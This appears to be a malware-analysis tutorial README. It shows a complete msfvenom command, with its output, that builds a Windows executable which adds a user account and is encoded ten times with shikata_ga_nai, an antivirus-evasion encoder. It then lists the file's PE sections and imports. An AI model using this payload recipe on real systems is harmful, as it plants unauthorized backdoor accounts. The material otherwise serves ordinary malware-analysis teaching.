# Malware-Analysis

Create Malicious exe file using Metasploit module (msfvenom) that adds a user "testuser321" and password "Test@321". Encode the file using encoder shikata_ga_nai with iteration 10 times as shown below.

root@kali64:~# msfvenom -p windows/adduser user=testuser1 pass=Test@321 -e x86/shikata_ga_nai -i 10 -f exe -o ~/testadd10.exe  
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload  

[-] No arch selected, selecting arch: x86 from the payload  
Found 1 compatible encoders  
Attempting to encode payload with 10 iterations of x86/shikata_ga_nai  
x86/shikata_ga_nai succeeded with size 303 (iteration=0)
x86/shikata_ga_nai succeeded with size 330 (iteration=1)
....
x86/shikata_ga_nai succeeded with size 519 (iteration=8)
x86/shikata_ga_nai succeeded with size 546 (iteration=9)
x86/shikata_ga_nai chosen with final size 546
Payload size: 546 bytes
Final size of exe file: 73802 bytes
Saved as: /root/testadd10.exe
root@kali64:~# 

# Getting Started & Examples
The script will show the sections and IAT of the file as shown below    

root@kali64:~# python pe_test.py testadd10.exe \
testadd10.exe
('.text\x00\x00\x00', '0x1000', '0xa966', 45056)
('.rdata\x00\x00', '0xc000', '0xfe6', 4096)
('.data\x00\x00\x00', '0xd000', '0x705c', 16384)
('.rsrc\x00\x00\x00', '0x15000', '0x7c8', 4096)
MSVCRT.dll
	_iob
	_except_handler3
	__set_app_type
	__p__fmode
	__p__commode
	_adjust_fdiv
	__setusermatherr
	_initterm
	__getmainargs
	__p___initenv
	_XcptFilter
	_exit
	_onexit
	__dllonexit
	strrchr
	wcsncmp
	_close
	wcslen
	wcscpy
	strerror
	modf
	strspn
	realloc
	__p__environ
	__p__wenviron
	_errno
	free
	strncmp
	strstr
	strncpy
	_ftol
	qsort
	fopen
	perror
	fclose
	fflush
	calloc
	malloc
	signal
	printf
	_isctype
	atoi
	exit
	__mb_cur_max
	_pctype
	strchr
	fprintf
	_controlfp
	_strdup
	_strnicmp
KERNEL32.dll
	PeekNamedPipe
	ReadFile
	WriteFile
	LoadLibraryA
	GetProcAddress
	GetVersionExA
	GetExitCodeProcess

